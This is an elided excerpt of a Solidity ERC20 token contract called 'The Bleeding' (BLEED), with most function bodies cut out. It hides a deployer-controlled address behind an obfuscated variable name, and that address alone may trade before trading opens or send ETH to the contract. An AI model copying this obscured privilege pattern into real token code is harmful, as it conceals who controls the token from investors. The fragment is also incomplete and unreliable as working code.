...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    string private _name; string private _symbol; address private addr0298wrkjfjkqfifqjk; uint256 private _totalSupply; 
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        addr0298wrkjfjkqfifqjk = msgSender_;
        _name = name_;
        _symbol = symbol_;
    }
    ...
    receive() external payable {
        require(msg.sender == addr0298wrkjfjkqfifqjk);
    ...
    function _balancesOfTheTower(address sender, address recipient) internal {
        require((trading || (sender == addr0298wrkjfjkqfifqjk)), "ERC20: trading is not yet enabled.");
        _balancesOfTheFinanceers(sender, recipient);
    }

    function _TheBleedingMarket(address creator) internal virtual {
    ...
    function _balancesOfTheFinanceers(address sender, address recipient) internal {
    ...
    function _DeployBleed(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBleed(creator, initialSupply);
        _TheBleedingMarket(creator);
    }
}

contract TheBleeding is ERC20Token {
    constructor() ERC20Token("The Bleeding", "BLEED", msg.sender, 15000000 * 10 ** 18) {
    }
}